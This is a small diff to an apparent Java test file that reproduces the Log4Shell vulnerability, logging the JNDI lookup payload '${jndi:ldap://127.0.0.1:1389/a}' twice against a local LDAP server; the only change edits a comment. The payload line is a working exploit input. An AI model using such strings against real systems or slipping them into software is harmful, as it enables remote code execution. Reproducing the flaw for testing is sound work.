@@ -8,7 +8,7 @@ public class Log4j {
     public static void main(String[] args) {
         // exploit will be executed
         logger.error("${jndi:ldap://127.0.0.1:1389/a}");
-        // no more exploits will be executed from here TBD - try with another file
+        // no more exploits will be executed from here TBD
         logger.error("${jndi:ldap://127.0.0.1:1389/a}");
     }
 }
